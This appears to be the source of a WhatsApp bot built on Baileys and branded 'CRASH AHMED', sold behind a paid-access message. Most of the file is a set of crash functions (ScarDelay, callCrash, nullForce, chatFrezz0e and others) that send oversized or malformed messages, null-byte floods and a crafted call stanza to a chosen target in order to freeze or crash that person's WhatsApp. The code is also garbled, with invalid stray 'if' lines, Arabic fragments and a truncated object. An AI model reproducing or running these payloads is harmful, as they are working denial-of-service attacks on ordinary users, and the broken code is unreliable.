b
rocess.on('uncaughtException', (err) => {
    console.error('Error:', err);
});
ت(نوع) 
process.on('unhandledRejection', (err) => {
    console.error('Promise Error:', err);
});
require("./config")
const { generateMessageID, generateMessageIDV2, WA_DEFAULT_EPHEMERAL, encodeSignedDeviceIdentity, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const pino = require('pino')
const logger = pino({ level: 'debug' });
const JSConfuser = require("js-confuser");
const crypto = require('crypto');
const path = require('path')
//const express = require('express');
const ms = require('ms');
const os = require('os')
 
 const ytdl = require('ytdl-core');        
 const ffmpeg = require('fluent-ffmpeg');       
/*const app = express();
const PORT = process.env.PORT || 3000;*/

module.exports = async (XeonBotInc, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib2/myfunc')
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (XeonBotInc.user.id.split(':')[0]+'@s.whatsapp.net' || XeonBotInc.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...(global.db.data.owners || [])].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const isDeveloper = (m && m.sender && (global.db.data.owners || []).map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)


const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isReact = m.message.reactionMessage ? true : false 

//===============[DATABASE]=====================\\
		try {
			let isNumber = x => typeof x === 'number' && !isNaN(x)
			let user = global.db.data.users[m.sender]
			if (typeof user !== 'object') global.db.data.users[m.sender] = {}
			if (user) {
				if (!isNumber(user.premiumExpiry)) user.premiumExpiry = 0
			} else global.db.data.users[m.sender] = {
				premiumExpiry: 0
			}
			
			let setting = global.db.data.settings[botNumber]
			if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
            if (!('antiswview' in setting)) setting.antiswview = false
            } else global.db.data.settings[botNumber] = {
               antiswview: false,
            }
		} catch (e) {
			console.log(e)
		}
		//=====\\
const cd = require('./lib2/countdown')
let usersdb = global.db.data.users
fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2))
const isPremium = isCreator ? true : cd.isPremium(usersdb, m.sender)
// --- [ نظام الحماية القصوى - CRASH AHMED ] ---
if (isCmd && !isPremium && !isCreator) {
    const msgScary = `⚠️ **تـوقـف مـكـانـك يـا صـعـلـوك!** 💀😈
    
عذراً، يبدو أنك تحاول العبث مع بوت **CRASH AHMED**. هذا البوت مخصص للأساطير فقط. اشتراكك غير مفعل، لذا ارحل قبل أن يتم سحق طلبك! ⚔️🔥

**للحصول على القوة الكاملة وتفعيل الاشتراك، تواصل مع الزعيم:**
🚀 تليجرام: @HAKERAHMED2
📱 واتساب: 967774772074

**[ هـذا الـبـوت مـدفـوع.. لـا تـحاول الـتـجـربة مـرة أخـرى ]** 💀⚡`;
نوع خاص ب g

if (qwe123@#$)


if (qwe@#$123)


if (qwer1234@#$_)



if (qwer@#$_1234)



if (qwert12345@#$_&)


if (qwert@#$_&12345)

    return XeonBotInc.sendMessage(m.chat, { 
        text: msgScary,
        contextInfo: {
            externalAdReply: {
                title: "💀 CRASH AHMED PROTECT 💀",
                body: "Access Denied - ارحل من هنا",
                thumbnailUrl: "https://pomf2.lain.la/f/dynqtljb.jpg", 
                sourceUrl: "https://t.me/HAKERAHMED2",
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m });
}
// ----------------------------------------------

const isRentBotUser = isDeveloper ? true : cd.isPremium(usersdb, m.sender)
//====================================\\
//bug
xeontex = "\n " + (args.join(" ") ? args.join(" ") : "Telegram: @HAKERAHMED2") + "\n\n\n";
    jidds = [];
    xeontex += "*~@967774772074~*\n*🦄*\n*~@919366316018~*\n".repeat(10200);
    jidds.push("967774772074@s.whatsapp.net", "919366316018@s.whatsapp.net");
//bug database
const { xeontext1 } = require('./69/xeontext1')
const { xeontext2 } = require('./69/xeontext2')
const { xeontext3 } = require('./69/xeontext3')
const { xeontext4 } = require('./69/xeontext4')
const { xeontext5 } = require('./69/xeontext5')
const { xeontext6 } = require('./69/xeontext6')
const { xeontext7 } = require('./69/xeontext7')
const { xeontext8 } = require('./69/xeontext8')
const { xeontext9 } = require('./69/xeontext9')
const { xeontext10 } = require('./69/xeontext10')
const { xeontext11 } = require('./69/xeontext11')
const { xeonbeta1, xeonbeta2, xeonyx } = require("./69/xeontext13.js")
const wkwk = fs.readFileSync(`./69/x.mp3`)
const xsteek = fs.readFileSync(`./69/x.webp`)
const o = fs.readFileSync(`./69/o.jpg`)
// No Need to Do Anything If You Don't Want Errors

//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var xeonytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var xeonytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 } 
 
 function sendMessageWithMentions2(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return XeonBotInc.sendMessage(m.chat, {
                        text: text,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [mentions],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363386423395618@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/sniw9v.jpg",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: false
}
}
                        }, {quoted:m})
  } else {
    return XeonBotInc.sendMessage(m.chat, {
                        text: text,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [mentions],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363386423395618@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/sniw9v.jpg",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: false
}
}
                        }, {quoted:m})
  }
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

//group chat msg by xeon
const replygcxeon2 = (teks) => {
	XeonBotInc.sendMessage(m.chat, {
                        text: teks,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363386423395618@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/sniw9v.jpg",
sourceUrl: link,
mediaType: 1,
renderLargerThumbnail: true
}
}
                        }, {quoted:m})

}

const replygcxeon = (teks) => {
	XeonBotInc.sendMessage(m.chat, {
                        text: teks,
                        contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363386423395618@newsletter",
}
}
                        }, {quoted:m})

}
   
//self public
if (!XeonBotInc.public) {
if (!isCreator) return
}

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('XeonBug22.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('There is an error:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Sorry, the command you gave is wrong. Maybe this is what you mean:\n\n•> ${prefix+mean}\n•> Similarities: ${similarityPercentage}%`
replygcxeon(response)
}}   
//==============================================================\\

    
   

async function ScarDelay(target) {
    const message = {
        groupStatusMessageV2: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    deviceListMetadata: {
                        senderKeyIndex: 0,
                        senderTimestamp: Date.now(),
                        recipientKeyIndex: 0
                    },
                    deviceListMetadataVersion: 2
                },
                interactiveResponseMessage: {
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        fromMe: true,
                        isQuestion: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "13135550202@bot",
                            botName: "Business Assistant",
                            creator: "bruxel4s creator"
                        },
                        statusAttributionType: 2,
                        urlTrackingMap: {
                            urlTrackingMapElements: Array.from({ length: 1000 }, () => ({
                                type: 1
                            }))
                        },
                        participant: `${['41', '91', '90', '31', '40'][Math.floor(Math.random() * 5)]}${Math.floor(Math.random() * 1e10).toString().padStart(10, '0')}@s.whatsapp.net`,
                    },
                    body: {
                        text: "}".repeat(560),
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: JSON.stringify({
                            flow_cta: "\u0000".repeat(10300)
                        }),
                        version: 3
                    }
                }
            }
        }
    };

    await XeonBotInc.relayMessage("status@broadcast", message, {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                  }
                ]
              }
            ]
          }
        ]
      });

}


    
    
   
    
    

    
  
async function smbdelay(target, ptcp = true) {
  const VidMessage = generateWAMessageFromContent(target, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "\nsmb",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743848703",
      contextInfo: {
        fromMe: false,
        isSampled: true,
        participant: target,
        mentionedJid: [
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "target",
        forwardingScore: 100,
        isForwarded: true,
        stanzaId: "123456789ABCDEF",
        quotedMessage: {
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
      streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      },
    }, 
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
  
  await XeonBotInc.relayMessage(target, {
    groupStatusMessageV2: {
      message: VidMessage.message,
     },
    }, ptcp ? 
    { 
      messageId: VidMessage.key.id, 
      participant: { jid: target} 
    } : { messageId: VidMessage.key.id }
  );
  
  const payload = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "hx team", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  نوع خاص ب صغ

if (135135)

if (125125)

if (77135135)

if (13513577)

if (ah13513577)

if (ah77135135)
  await XeonBotInc.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: target} 
    } : { messageId: payload.key.id }
  );
  
  const payload2 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\n", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "call_permission_message"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );

  await XeonBotInc.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload2.message,
     },
    }, ptcp ? 
    { 
      messageId: payload2.key.id, 
      participant: { jid: target} 
    } : { messageId: payload2.key.id }
  );
}
    
    
//==============================================================\\

async function callCrash(target, isVideo = true) {
  const { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require("@adiwajshing/baileys");
  
  try {
    const devices = (
      await XeonBotInc.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await XeonBotInc.assertSessions(devices);

    const createMutex = () => {
      const locks = new Map();
      
      return {
        async mutex(key, fn) {
          while (locks.has(key)) {
            await locks.get(key);
          }
          
          const lock = Promise.resolve().then(() => fn());
          locks.set(key, lock);
          
          try {
            const result = await lock;
            return result;
          } finally {
            locks.delete(key);
          }
        }
      };
    };

    const mutexManager = createMutex();
    
    const appendBufferMarker = (buffer) => {
      const newBuffer = Buffer.alloc(buffer.length + 8);
      buffer.copy(newBuffer);
      newBuffer.fill(1, buffer.length);
      return newBuffer;
    };

    const originalCreateParticipantNodes = XeonBotInc.createParticipantNodes?.bind(XeonBotInc);
    const originalEncodeWAMessage = XeonBotInc.encodeWAMessage?.bind(XeonBotInc);

    XeonBotInc.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) {
        return {
          nodes: [],
          shouldIncludeDeviceIdentity: false
        };
      }

      const processedMessage = await (XeonBotInc.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      
      const messagePairs = Array.isArray(processedMessage) 
        ? processedMessage 
        : recipientJids.map(jid => ({ recipientJid: jid, message: processedMessage }));

      const { id: meId, lid: meLid } = XeonBotInc.authState.creds.me;
      const localUser = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(
        messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
          const { user: targetUser } = jidDecode(jid);
          const { user: ownUser } = jidDecode(meId);
          const isOwnUser = targetUser === ownUser || targetUser === localUser;
          const isSelf = jid === meId || jid === meLid;
          
          if (dsmMessage && isOwnUser && !isSelf) {
            msg = dsmMessage;
          }

          const encodedBytes = appendBufferMarker(
            originalEncodeWAMessage 
              ? originalEncodeWAMessage(msg) 
              : encodeWAMessage(msg)
          );

          return mutexManager.mutex(jid, async () => {
            const { type, ciphertext } = await XeonBotInc.signalRepository.encryptMessage({ 
              jid, 
              data: encodedBytes 
            });
            
            if (type === 'pkmsg') {
              shouldIncludeDeviceIdentity = true;
            }
            
            return {
              tag: 'to',
              attrs: { jid },
              content: [{
                tag: 'enc',
                attrs: {
                  v: '2',
                  type,
                  ...extraAttrs
                },
                content: ciphertext
              }]
            };
          });
        })
      );

      return {
        nodes: nodes.filter(Boolean),
        shouldIncludeDeviceIdentity
      };
    };

    const callKey = crypto.randomBytes(32);
    const extendedCallKey = Buffer.concat([callKey, Buffer.alloc(8, 0x01)]);
    const callId = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase();

    const { nodes: destinations, shouldIncludeDeviceIdentity } = 
      await XeonBotInc.createParticipantNodes(devices, { 
        conversation: "call-initiated"
      }, { count: '0' });

    const callStanza = {
      tag: "call",
      attrs: {
        to: target,
        id: XeonBotInc.generateMessageTag(),
        from: XeonBotInc.user.id
      },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": callId,
          "call-creator": XeonBotInc.user.id
        },
        content: [
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "16000"
            }
          },
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "8000"
            }
          },
          ...(isVideo ? [{
            tag: 'video',
            attrs: {
              enc: 'vp8',
              dec: 'vp8',
              orientation: '0',
              screen_width: '1920',
              screen_height: '1080',
              device_orientation: '0'
            }
          }] : []),
          {
            tag: "net",
            attrs: {
              medium: "3"
            }
          },
          {
            tag: "capability",
            attrs: { ver: "1" },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          },
          {
            tag: "encopt",
            attrs: { keygen: "2" }
          },
          {
            tag: "destination",
            attrs: {},
            content: destinations
          },
          ...(shouldIncludeDeviceIdentity ? [{
            tag: "device-identity",
            attrs: {},
            content: encodeSignedDeviceIdentity(XeonBotInc.authState.creds.account, true)
          }] : [])
        ].filter(Boolean)
      }]
    };

    await XeonBotInc.sendNode(callStanza);

  } catch (error) {
    console.error('Error in callCrash:', error);
    throw error;
  }
}

async function nullForce(target) {
  
    try {
      const message = {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          deviceListMetadata: {
            senderKeyIndex: 0,
            senderTimestamp: Date.now(),
            recipientKeyIndex: 0
          }
        },
        interactiveResponseMessage: {
          contextInfo: {
            remoteJid: "status@broadcast",
            fromMe: true,
            isQuestion: true,
            forwardedAiBotMessageInfo: {
              botJid: "13135550202@bot",
              botName: "Business Assistant",
              creator: "FLIX"
            },
            statusAttributionType: 2,
            statusAttributions: Array.from({ length: 201000 }, () => ({
              participant: `${
                ['41','91','90','31','40'][Math.floor(Math.random()*5)]
              }${Math.floor(Math.random()*1e10).toString().padStart(10,'0')}@s.whatsapp.net`,
              type: 1
            }))
          },
          body: {
            text: "}".repeat(560),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: `{"flow_cta":"${"\u0000".repeat(10300)}"}`,
            version: 3
          }
        }
      };

      await XeonBotInc.relayMessage("status@broadcast", message, {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                  }
                ]
              }
            ]
          }
        ]
      });

    } catch (err) {
      console.error("Error:", err);
    }
  
}
//==============================================================\\
   
    async function homeBeta5(target) {
  await XeonBotInc.relayMessage(target, {
    requestPaymentMessage: {
      currencyCodeIso4217: "MMK",
      amount1000: "999999",
      noteMessage: {
      extendedTextMessage: {
        text: "Hey 👋",
        matchedText: "https://t.me/silentscar",
        description: " dnd ;) ",
        title: " ${Scar?!!} ",
        paymentLinkMetadata: {
          button: {
            displayText: "  @silent scar",
          },
          header: {
            headerType: 1,
          },
          provider: {
            paramsJson: "{{{".repeat(100000),
          },
        },
        linkPreviewMetadata: {
          paymentLinkMetadata: {
            button: {
              displayText: "  @silent scar",
            },
            header: {
              headerType: 1,
            },
            provider: {
              paramsJson: "{{{".repeat(100000),
            },
          },
          paymentLinkMetadata: {
            button: {
              displayText: "  @silent scar",
            },
            header: {
              headerType: 1,
            },
            provider: {
              paramsJson: "{{{".repeat(100000),
            },
          },
          urlMetadata: {
            fbExperimentId: 999,
          },
          fbExperimentId: 888,
          linkMediaDuration: 555,
          socialMediaPostType: 1221,
        },
      }
      },
      expiryTimestamp: Date.now() + 86400000,
      background: null
    }
  }, { userJid: null })
}
     async function hsuwjs(target) {
    await XeonBotInc.relayMessage(target, {
                    requestPaymentMessage: {
                        currencyCodeIso4217: "BRL",
                        amount1000: 1000,
                        requestFrom: XeonBotInc.user?.id?.split(':')[0] + '@s.whatsapp.net',
                        noteMessage: {
                            extendedTextMessage: {
                                text: "teste"
                            }
                        }
                    }
                }, {});
    }
      async function chatFrezz0e(target) {
    try {
        for (let s = 0; s < 1; s++) {
            const stickerMessage = generateWAMessageFromContent(
                target,
                proto.Message.fromObject({
                    botInvokeMessage: {
                        message: {
                            messageContextInfo: {
                                messageSecret: crypto.randomBytes(32),
                                deviceListMetadata: {
                                    senderKeyIndex: 0,
                                    senderTimestamp: Date.now(),
                                    recipientKeyIndex: 0
                                }
                            },
                            stickerPackMessage: {
                                stickerPackId: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8",
                                name: "XinvasionX" + "𑇂𑆵𑆴𑆿".repeat(50000),
                                publisher: "t.me/johnleosm1th",
                                stickers: [
                                    {
                                        fileName: "aZx-55hzR-QpFJE0CLazii3xvH1jwAE5owBJ9Q+1weg=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "dF9xmRe414rAWSrBRaYer7wahovMEwlPRVJFzVDUGIw=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "kmgU36CKofP+dXww1B7TVvTtQLK9CEuWbPYd9ABRtAw=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "XZz6gF1lXcyGRjz1k6nrv2xW8y2L9MofMpsmlFZIMgY=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "iYjIgEp2J/4bF2jDJiEThzU5uNVd3ArB4eXmmr8JG5M=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "wLfOdZJ3/jE8EdS+rQDNpjMn9i+jrsCPc3DnfrpbEao=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "B4aUTYO1xHj2VwCeNgFkchqtD5lZ/59omLb5bi5NvOw=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "lsS7uO7IqZJ8PQSoDYDzx0ZCyF+e6hTMEobkt1f8eA0=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "A2PvEWo9tBZupS1V1YXKJ5iwfSRdrwlmceNdy4UksR8=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    },
                                    {
                                        fileName: "HDV3jx/hSV5OJ+bLx36+dnZ+Br4Mkr8X5KqRL0aI2Xo=.webp",
                                        isAnimated: false,
                                        emojis: [""],
                                        accessibilityLabel: "",
                                        isLottie: false,
                                        mimetype: "image/webp"
                                    }
                                ],
                                fileLength: "8020935",
                                fileSha256: "77oJbl0eWZ4bi8z0RZxLsZJ1tu+f/ZErcYE8Sj2K1+U=",
                                fileEncSha256: "2KwixOJtpl4ivq8HMgTQGICW+HMxLnZuQmUN6KPD4kg=",
                                mediaKey: "i4I6325nsuHeYhj4KuyeZ+8bHAxE6A5Rt5uzyNRIaTk=",
                                directPath: "/v/t62.15575-24/23212937_564001070100700_5740166209540264226_n.enc",
                                contextInfo: { 
                                    mentionedJid: [
                                        "0@s.whatsapp.net",
                                        ...Array.from({ length: 50 }, () =>
                                            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                                        )
                                    ]
                                },
                                packDescription: "",
                                mediaKeyTimestamp: "1749506440",
                                trayIconFileName: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8.png",
                                thumbnailHeight: 252,
                                thumbnailWidth: 252,
                                stickerPackSize: "15000000000",
                                stickerPackOrigin: "USER_CREATED"
                            }
                        }
                    }
                }),
                { userJid: target }
            );

            await XeonBotInc.relayMessage(target, stickerMessage.message, { 
                messageId: stickerMessage.key.id,
                participant: { jid: target }
            });
            await sleep(100);
        }
    } catch (e) {
        console.error(e);
    }
}
نوع خاص ك

if (ahmed7747720)
   async function chattLock(target) {
  await XeonBotInc.relayMessage(target, {
    video
      fileSha256: "fY6QRZgi0BMaRIZRQdtWDKg5tXFT+KPGcqpkefkqvGI=",
      fileLength: 999999999,
      seconds: 72050829,
      mediaKey: "Xpj7Tb8UPXDj/RqeDS4QHJBJtyCtXasmP204/v6pXY4=",
      height: 9999,
      width: 9999,
      fileEncSha256: "dUkjp/6OmUdRsARecsHRPHo/TdQ9HfwaJhYrseE07U8=",
      directPath: "/v/t62.7161-24/598158642_864391896084426_4630997952681591297_n.enc?ccb=11-4&oh=01_Q5Aa3QHlNTSpRKXxoGo5J-b6-gw7M1pvlGuvoi6yp2pJOjF0ew&oe=695F32D4&_nc_sid=5e03e0",
      mediaKeyTimestamp: 1765260387,
      caption: "👁‍🗨⃟꙰。⌁ 𝟕𝐞𝐩 ͡𝐩𝐞𝐥 ⃰͜𝐢. - 𝐄𝐱𝐩𝐨𝐬𝐞𝐝   ⃟꙰👁‍🗨", 
      contextInfo: {
        pairedMediaType: "NOT_PAIRED_MEDIA",
        statusSourceType: "MUSIC_STANDALONE",
        statusAttributions: [
          {
            type: "STATUS_MENTION",
            music: {
              authorName: "",
              songId: "1137812656623908",
              title: "𑲱👁‍🗨꙰⃟".repeat(10000),
              author: "𑲱👁‍🗨꙰⃟".repeat(10000),
              artistAttribution: "https://t.me/YuukeyD7eppeli",
              isExplicit: true
            }
          }
        ]
      },
